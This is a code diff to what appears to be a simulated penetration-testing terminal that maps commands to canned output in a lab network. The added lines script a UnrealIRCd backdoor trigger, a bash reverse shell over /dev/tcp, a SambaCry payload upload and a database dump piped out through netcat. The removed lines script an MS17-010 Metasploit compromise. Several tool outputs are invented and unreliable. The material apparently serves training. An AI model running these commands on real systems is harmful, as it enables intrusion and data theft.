@@ -6,15 +6,24 @@ Nmap scan report for kali (192.168.202.132)
 Host is up (0.00012s latency).
 Nmap scan report for ubuntu (192.168.202.136)
 Host is up (0.00045s latency).
-Nmap scan report for win7 (192.168.202.137)
+Nmap scan report for metasploitable (192.168.202.137)
 Host is up (0.00051s latency).
 Nmap done: 256 IP addresses (3 hosts up) scanned in 2.14 seconds`,
 
-  "nmap -sV -p 139,445 192.168.202.137": `PORT    STATE SERVICE      VERSION
-139/tcp open  netbios-ssn  Windows 7 SP1
-445/tcp open  microsoft-ds Windows 7 SP1
+  "nmap -sV -p 6667 192.168.202.137": `PORT     STATE SERVICE VERSION
+6667/tcp open  irc     UnrealIRCd 3.2.8.1
 MAC Address: 00:0C:29:48:D1:30 (VMware)
-OS: Windows 7 Ultimate 7601 SP1 (32-bit)`,
+Service Info: Host: irc.Metasploitable.LAN`,
+
+  "nmap -p 6667 --script irc-unrealircd-backdoor 192.168.202.137": `PORT     STATE SERVICE VERSION
+6667/tcp open  irc     UnrealIRCd
+| irc-unrealircd-backdoor:
+|   VULNERABLE:
+|   UnrealIRCd Backdoor Detection
+|     State: VULNERABLE
+|     IDs: CVE:CVE-2010-2075
+|     Risk factor: CRITICAL
+|     Description: UnrealIRCd 3.2.8.1 contains a trojan backdoor (DEBUG3_DOLOG_SYSTEM macro) allowing RCE via 'AB; <cmd>'`,
 
   "nmap -sV -p 139,445 192.168.202.136": `PORT    STATE SERVICE     VERSION
 139/tcp open  netbios-ssn Samba smbd 4
@@ -22,92 +31,93 @@ OS: Windows 7 Ultimate 7601 SP1 (32-bit)`,
 MAC Address: 00:0C:29:D4:E1:C3 (VMware)
 OS: Linux Ubuntu`,
 
-  "nmap -p445 --script smb-vuln-ms17-010 192.168.202.137": `Host script results:
-| smb-vuln-ms17-010:
+  "nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.202.136": `PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+| smb-vuln-cve-2017-7494:
 |   VULNERABLE:
-|   Remote Code Execution vulnerability in Microsoft SMBv1
+|   Samba RCE (SambaCry)
 |     State: VULNERABLE
-|     IDs: CVE:CVE-2017-0143
-|     Risk factor: HIGH
-|     Disclosure date: 2017-03-14`,
+|     IDs: CVE:CVE-2017-7494
+|     Risk factor: CRITICAL
+|     Description: Samba 3.5.0 - 4.6.4 is vulnerable to remote code execution from a writable share.`,
+
+  "smbclient -L //192.168.202.136 -N": `Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      Temporary file share (read/write)
+	opt             Disk      
+	IPC$            IPC       IPC Service (samba server)
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            UBUNTU`,
+
+  "gcc -shared -fPIC -nostartfiles -o payload.so shell.c": `[+] Compiling shell.c with constructor attribute...
+[+] Generated shared library: payload.so (reverse shell -> 192.168.202.132:4444)`,
+
+  'smbclient //192.168.202.136/tmp -N -c "put payload.so"': `Anonymous login successful
+putting file payload.so as \\payload.so (1240.2 kb/s)
+[+] Upload payload.so to share /tmp completed successfully!`,
+
+  "python3 exploit.py -t 192.168.202.136 -e /tmp/payload.so": `[*] Triggering SambaCry CVE-2017-7494 on 192.168.202.136...
+[*] Loading shared module from /tmp/payload.so...
+[+] Reverse shell executed successfully! Connect to [192.168.202.132:4444]
+bash-4.3#`,
+
+  "nc -nv 192.168.202.137 6667": `(UNKNOWN) [192.168.202.137] 6667 (ircd) open
+:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+:irc.Metasploitable.LAN NOTICE AUTH :*** Found your hostname`,
+
+  "AB; id": `uid=0(root) gid=0(root) groups=0(root)
+[+] Backdoor trigger confirmed! Executed command with root privileges.`,
+
+  "python3 exploit_irc.py": `[*] Connecting to 192.168.202.137:6667...
+[*] Banner: :irc.Metasploitable.LAN NOTICE AUTH :*** Found your hostname
+[*] Sending backdoor payload (AB; bash -i >& /dev/tcp/192.168.202.132/4444 0>&1)...
+[+] Payload sent! Connection received on nc listener:
+connect to [192.168.202.132] from (UNKNOWN) [192.168.202.137] 54321
+bash: no job control in this shell
+root@metasploitable:/#`,
+
+  'mysql -u root -e "show databases;"': `+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| dvwa               |
+| metasploit         |
+| mysql              |
+| owasp10            |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+`,
+
+  "mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999": `[+] Dumping all databases (dvwa, metasploit, mysql, owasp10, tikiwiki)...
+[+] Exfiltrating full database dump via Netcat to Kali2 (192.168.202.134:9999)...
+[+] Transfer complete: 18,452 lines sent successfully.`,
 
   "enum4linux -a 192.168.202.136": `[+] Got domain/workgroup name: WORKGROUP
 [+] Server 192.168.202.136 allows sessions using username='', password=''
 [+] Share Enumeration:
     Sharename    Type    Comment
     ---------    ----    -------
-    public       Disk    
+    tmp          Disk    Temporary file share (read/write)
+    opt          Disk    
     IPC$         IPC     IPC Service
 [+] Attempting to map shares:
-//192.168.202.136/public    Mapping: OK  Listing: OK  Writing: OK`,
+//192.168.202.136/tmp    Mapping: OK  Listing: OK  Writing: OK`,
 
-  "smbclient -L 192.168.202.136 -N": `Sharename    Type    Comment
----------    ----    -------
-public       Disk    
-IPC$         IPC     IPC Service (ubuntu server)`,
+  "whoami": `root`,
 
-  "smbclient //192.168.202.136/public -N": `Try "help" to get a list of possible commands.`,
+  "uname -a": `Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux`,
 
-  "ls": `  .                        D    0  Mon Nov 10 20:35:37 2026
-  ..                       D    0  Mon Nov 10 20:35:37 2026
-  secret.txt               N   27  Mon Nov 10 20:35:37 2026
-  config.bak               N  512  Mon Nov 10 20:35:37 2026
-  passwords.txt            N  128  Mon Nov 10 20:35:37 2026
-20458536 blocks of size 1024. 11817784 blocks available`,
-
-  "get secret.txt": `getting file \\secret.txt of size 27 as secret.txt (26.4 KiloBytes/sec) (average 26.4 KiloBytes/sec)
-[+] File downloaded successfully!
-Content: "Day la file bi lo hong SMB"`,
-
-  "get passwords.txt": `getting file \\passwords.txt of size 128 as passwords.txt
-[+] File downloaded successfully!
-Content: "admin:P@ssw0rd123 | hacker:1234"`,
-
-  "get config.bak": `getting file \\config.bak of size 512 as config.bak
-[+] File downloaded successfully!
-Content: "[global] workgroup = WORKGROUP | map to guest = Bad User"`,
-
-  "msfconsole": `       =[ metasploit v6.3.44-dev                          ]
-+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads ]
-+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion  ]`,
-
-  "use exploit/windows/smb/ms17_010_psexec": `[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp`,
-
-  "set RHOSTS 192.168.202.137": `RHOSTS => 192.168.202.137`,
-  "set LHOST 192.168.202.132": `LHOST => 192.168.202.132`,
-  "set PAYLOAD windows/meterpreter/reverse_tcp": `PAYLOAD => windows/meterpreter/reverse_tcp`,
-  "set SMBUser hacker": `SMBUser => hacker`,
-  "set SMBPass 1234": `SMBPass => 1234`,
-
-  "exploit": `[*] Started reverse TCP handler on 192.168.202.132:4444
-[*] 192.168.202.137:445 - Target OS: Windows 7 Ultimate 7601 SP1
-[*] 192.168.202.137:445 - Built a write-what-where primitive...
-[+] 192.168.202.137:445 - Overwrite complete... SYSTEM session obtained!
-[*] 192.168.202.137:445 - Selecting PowerShell target
-[*] 192.168.202.137:445 - Executing the payload...
-[*] Sending stage (199238 bytes) to 192.168.202.137
-[*] Meterpreter session 1 opened (192.168.202.132:4444 -> 192.168.202.137:49169)`,
-
-  "getuid": `Server username: NT AUTHORITY\\SYSTEM`,
-
-  "sysinfo": `Computer        : WIN7-PC
-OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
-Architecture    : x86
-System Language : vi_VN
-Logged On Users : 2
-Meterpreter     : x86/windows`,
-
-  "shell": `Process 648 created.
-Channel 1 created.
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.`,
-
-  "whoami": `nt authority\\system`,
-
-  "net user": `User accounts for \\\\WIN7-PC
--------------------------------------------------------------------------------
-Administrator            Guest                    hacker
-The command completed successfully.`,
+  "id": `uid=0(root) gid=0(root) groups=0(root)`,
 
   "ifconfig": `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.202.132  netmask 255.255.255.0  broadcast 192.168.202.255
